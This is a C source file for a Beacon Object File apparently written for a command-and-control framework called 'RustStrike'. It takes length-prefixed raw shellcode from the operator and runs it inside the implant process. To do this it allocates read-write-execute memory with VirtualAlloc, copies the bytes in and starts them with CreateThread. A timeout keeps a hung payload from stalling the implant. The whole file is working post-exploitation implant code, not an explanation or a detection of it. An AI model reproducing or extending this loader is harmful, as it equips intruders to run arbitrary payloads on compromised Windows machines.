/*
 * shellcode_exec BOF for RustStrike — run raw shellcode in-process (VirtualAlloc
 * + CreateThread), component-driven.
 *
 *   args: [2-byte LITTLE-ENDIAN length][raw shellcode bytes]
 *         exactly what ShellcodeExecutor.vue builds:
 *           args = [len & 0xff, (len >> 8) & 0xff, ...bytes]
 *         (no null terminator — unlike encodeBeaconString.)
 *
 * Allocates RWX memory, copies the shellcode in, fires it on a new thread, and
 * waits for it to return. Prints:
 *   shellcode_exec: executed ok (<n> bytes)      on success
 *   shellcode_exec: ...                          on failure (CALLBACK_ERROR)
 *
 * NOTE: this runs arbitrary code in the implant process. It's the operator's
 * shellcode — make sure you trust it. WaitForSingleObject uses a generous but
 * bounded timeout so a hanging payload doesn't wedge the implant forever.
 *
 * Build (mingw):
 *   gcc -c examples/shellcode_exec.c -o examples/shellcode_exec.x64.o
 */
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T,
    LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$GetExitCodeThread(HANDLE, LPDWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);

#define WAIT_MS 30000   /* 30s cap — a hung payload shouldn't wedge the implant */

void go(char *args, int alen) {
    if (alen < 2) {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec: no shellcode (need >=2 byte len prefix)");
        return;
    }
    int len = (unsigned char)args[0] | ((unsigned char)args[1] << 8);
    if (len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec: zero-length shellcode");
        return;
    }
    if (len > alen - 2) len = alen - 2;   /* clamp to what's actually present */
    unsigned char *sc = (unsigned char *)(args + 2);

    /* Allocate RWX. PAGE_EXECUTE_READWRITE (0x40) is the simplest path; the
     * loader's CRT helpers don't expose a VirtualAlloc-with-RW-then-VirtualProtect
     * dance here — this BOF is the straightforward variant. */
    void *mem = KERNEL32$VirtualAlloc(NULL, (SIZE_T)len, 0x3000 /*MEM_COMMIT|MEM_RESERVE*/,
                                      0x40 /*PAGE_EXECUTE_READWRITE*/);
    if (!mem) {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec: VirtualAlloc failed (%lu)",
                     KERNEL32$GetLastError());
        return;
    }

    /* Copy the shellcode in. We can't use memcpy (no imported CRT here beyond
     * _snprintf), so copy byte-by-byte. */
    unsigned char *dst = (unsigned char *)mem;
    for (int i = 0; i < len; i++) dst[i] = sc[i];

    HANDLE th = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!th || th == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec: CreateThread failed (%lu)",
                     KERNEL32$GetLastError());
        KERNEL32$VirtualFree(mem, 0, 0x8000 /*MEM_RELEASE*/);
        return;
    }

    DWORD w = KERNEL32$WaitForSingleObject(th, WAIT_MS);
    DWORD exitCode = 0;
    KERNEL32$GetExitCodeThread(th, &exitCode);
    KERNEL32$CloseHandle(th);

    /* v1 intentionally leaks the RWX page (BOF image memory is kept for
     * process lifetime too; matching that policy here keeps things simple and
     * avoids freeing memory a still-running thread might touch). */
    if (w == 0x00000000 /*WAIT_OBJECT_0*/) {
        BeaconPrintf(CALLBACK_OUTPUT, "shellcode_exec: executed ok (%d bytes, thread exit %lu)",
                     len, exitCode);
    } else if (w == 0x00000102 /*WAIT_TIMEOUT*/) {
        BeaconPrintf(CALLBACK_OUTPUT, "shellcode_exec: thread still running after %dms (%d bytes)",
                     WAIT_MS, len);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec: WaitForSingleObject=%lu (%lu)",
                     w, KERNEL32$GetLastError());
    }
}
